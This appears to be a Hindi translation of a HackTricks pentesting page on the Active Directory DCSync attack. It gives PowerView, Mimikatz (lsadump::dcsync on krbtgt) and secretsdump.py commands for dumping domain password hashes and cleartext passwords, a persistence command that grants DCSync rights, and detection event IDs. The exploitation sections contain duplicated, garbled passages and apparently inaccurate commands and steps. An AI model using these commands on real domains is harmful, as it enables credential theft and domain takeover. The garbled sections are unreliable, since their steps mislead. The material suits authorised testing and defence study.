# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्ल्ड के सबसे उन्नत सामुदायिक उपकरणों द्वारा संचालित **ऑटोमेटिक वर्कफ़्लो** बनाएं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** की जाए? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग करने की सुविधा** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके**।

</details>

## DCSync

**DCSync** अनुमति में शामिल है कि डोमेन इसके ऊपर निम्नलिखित अनुमतियाँ हों: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।

**DCSync के बारे में महत्वपूर्ण नोट:**

* **DCSync हमला एक डोमेन कंट्रोलर के व्यवहार की नकल करता है और अन्य डोमेन कंट्रोलर से जानकारी की प्रतिलिपि करने के लिए कहता है** डायरेक्टरी रिप्लिकेशन सेवा रिमोट प्रोटोकॉल (MS-DRSR) का उपयोग करके। क्योंकि MS-DRSR एक मान्य और आवश्यक Active Directory की कार्यक्षमता है, इसे बंद नहीं किया जा सकता है और नहीं अक्षम किया जा सकता है।
* डिफ़ॉल्ट रूप से केवल **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** समूहों के पास आवश्यक अधिकार होते हैं।
* यदि किसी खाते के पास पुनर्वर्ती एन्क्रिप्शन के साथ संग्रहीत किए गए पासवर्ड होते हैं, तो Mimikatz में एक विकल्प उपलब्ध होता है जो साफ टेक्स्ट में पासवर्ड लौटाता है

### जाँच

`powerview` का उपयोग करके इन अनुमतियों वाले लोगों की जाँच करें:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### स्थानीय रूप से शोषण करें

यह तकनीक उन स्थानीय हमलों को वर्णन करती है जो एक हमलावर को एक्टिव डायरेक्टरी डोमेन के अंदर एक डोमेन नियंत्रक के रूप में अधिकार प्राप्त करने की अनुमति देती है। इसके लिए, हमलावर को एक व्यक्ति के रूप में एक्टिव डायरेक्टरी डोमेन में पंजीकृत होना चाहिए और उसे एक्टिव डायरेक्टरी के एक डोमेन नियंत्रक के रूप में प्रमाणित करने की आवश्यकता होती है। इसके बाद, हमलावर को एक्टिव डायरेक्टरी के एक डोमेन नियंत्रक के रूप में उपयोग किया जा सकता है और उसे डोमेन के सभी विवरणों को प्राप्त करने की अनुमति मिलती है, जिसमें सम्मिलित हैंडल, उपयोगकर्ता नाम, उपयोगकर्ता शब्दकोश, समूह, और अन्य विवरण हो सकते हैं।

इस तकनीक का उपयोग करने के लिए, हमें एक्टिव डायरेक्टरी डोमेन में एक उपयोगकर्ता के रूप में पंजीकृत होने की आवश्यकता होती है और उसे एक्टिव डायरेक्टरी के एक डोमेन नियंत्रक के रूप में प्रमाणित करने की आवश्यकता होती है। इसके बाद, हम निम्नलिखित कमांड का उपयोग करके उपयोगकर्ता के रूप में एक्टिव डायरेक्टरी डोमेन में प्रमाणित हो सकते हैं:

```plaintext
kinit <username>@<domain>
```

इसके बाद, हम निम्नलिखित कमांड का उपयोग करके डोमेन के सभी विवरणों को प्राप्त कर सकते हैं:

```plaintext
dcsync <domain>
```

इस तकनीक का उपयोग करने के लिए, हमें एक्टिव डायरेक्टरी डोमेन में एक उपयोगकर्ता के रूप में पंजीकृत होने की आवश्यकता होती है और उसे एक्टिव डायरेक्टरी के एक डोमेन नियंत्रक के रूप में प्रमाणित करने की आवश्यकता होती है। इसके बाद, हम निम्नलिखित कमांड का उपयोग करके उपयोगकर्ता के रूप में एक्टिव डायरेक्टरी डोमेन में प्रमाणित हो सकते हैं:

```plaintext
kinit <username>@<domain>
```

इसके बाद, हम निम्नलिखित कमांड का उपयोग करके डोमेन के सभी विवरणों को प्राप्त कर सकते हैं:

```plaintext
dcsync <domain>
```
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ शोषण

इस तकनीक का उपयोग करके हम दूरस्थ संगणकों को शोषित कर सकते हैं। इसके लिए हमें निम्नलिखित कदमों का पालन करना होगा:

1. एक विंडोज सिस्टम पर एक निर्दिष्ट उपयोगकर्ता खाता का निर्माण करें और उसे "डोमेन एडमिन" या "एंटरप्राइज एडमिन" की भूमिका दें।
2. एक विंडोज सिस्टम पर "Impacket" टूलसेट को इंस्टॉल करें।
3. निर्दिष्ट उपयोगकर्ता खाता के लिए "ntds.dit" फ़ाइल को डाउनलोड करें।
4. "ntds.dit" फ़ाइल को "secretsdump.py" टूल का उपयोग करके शोषित करें।
5. शोषित "ntds.dit" फ़ाइल से उपयोगकर्ता क्रेडेंशियल्स को प्राप्त करें।

इस तकनीक का उपयोग करके हम दूरस्थ संगणकों को शोषित कर सकते हैं और उपयोगकर्ता क्रेडेंशियल्स प्राप्त कर सकते हैं। इसके लिए हमें निम्नलिखित कदमों का पालन करना होगा:

1. एक विंडोज सिस्टम पर एक निर्दिष्ट उपयोगकर्ता खाता का निर्माण करें और उसे "डोमेन एडमिन" या "एंटरप्राइज एडमिन" की भूमिका दें।
2. एक विंडोज सिस्टम पर "Impacket" टूलसेट को इंस्टॉल करें।
3. निर्दिष्ट उपयोगकर्ता खाता के लिए "ntds.dit" फ़ाइल को डाउनलोड करें।
4. "ntds.dit" फ़ाइल को "secretsdump.py" टूल का उपयोग करके शोषित करें।
5. शोषित "ntds.dit" फ़ाइल से उपयोगकर्ता क्रेडेंशियल्स को प्राप्त करें।
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` तीन फ़ाइलें उत्पन्न करता है:

* एक में **NTLM हैश** होते हैं
* एक में **Kerberos कुंजी** होती है
* एक में NTDS से **साफ़-पाठ पासवर्ड** होते हैं जो [**पलटने योग्य एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम किए गए होते हैं। आप पलटने योग्य एन्क्रिप्शन वाले उपयोगकर्ताओं को निम्नलिखित पावरव्यू के साथ प्राप्त कर सकते हैं:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### स्थिरता

यदि आप डोमेन व्यवस्थापक हैं, तो आप `powerview` की सहायता से किसी भी उपयोगकर्ता को इस अनुमति प्रदान कर सकते हैं:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
तब आप **यह जांच सकते हैं कि क्या उपयोगकर्ता को सही ढंग से असाइन किया गया** है 3 विशेषाधिकारों को, उन्हें खोजकर देखें (आपको "ObjectType" फ़ील्ड के अंदर विशेषाधिकारों के नाम दिखाई देने चाहिए)।
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### रोकथाम

* सुरक्षा ईवेंट आईडी 4662 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक ऑब्जेक्ट पर एक कार्रवाई की गई थी
* सुरक्षा ईवेंट आईडी 5136 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक डायरेक्टरी सेवा ऑब्जेक्ट में संशोधन किया गया था
* सुरक्षा ईवेंट आईडी 4670 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक ऑब्जेक्ट पर अनुमतियाँ बदल दी गई थी
* AD ACL स्कैनर - ACL के बारे में रिपोर्ट बनाने और तुलना करने के लिए बनाएं। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## संदर्भ

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की आवश्यकता** है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)।

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
